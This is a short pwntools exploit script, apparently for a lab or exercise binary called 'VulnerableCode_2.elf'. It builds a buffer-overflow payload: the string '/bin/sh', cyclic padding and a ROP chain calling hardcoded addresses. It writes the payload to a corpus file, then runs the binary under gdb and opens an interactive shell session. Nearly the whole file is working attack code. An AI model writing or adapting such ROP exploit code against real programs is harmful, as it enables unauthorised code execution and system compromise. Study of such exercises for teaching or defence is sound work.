from pwn import *
import tempfile

rop = ROP('./VulnerableCode_2.elf')
rop.call(0x565565bf)
rop.raw(p32(0x56559080))
rop.raw(p32(0x56559080))
payload = '/bin/sh\x00' + cyclic(68 - 8) + str(rop)

f = open("corpus_2/exp2_4.bin", "wb")
f.write(payload)
f.close()

elf = ELF('./VulnerableCode_2.elf')
#p = process(argv=["./VulnerableCode_2.elf", "2", "corpus_2/exp2_4.bin"], aslr=False)
p = gdb.debug(["./VulnerableCode_2.elf", "4", "2", "corpus_2/exp2_4.bin"],
        '''
        set follow-fork-mode parent
        b *0x565563cf
        '''
)
#pid = gdb.attach(p.pid, gdbscript='''
#        b main
#        '''
#)

print(p.recv())
p.interactive()
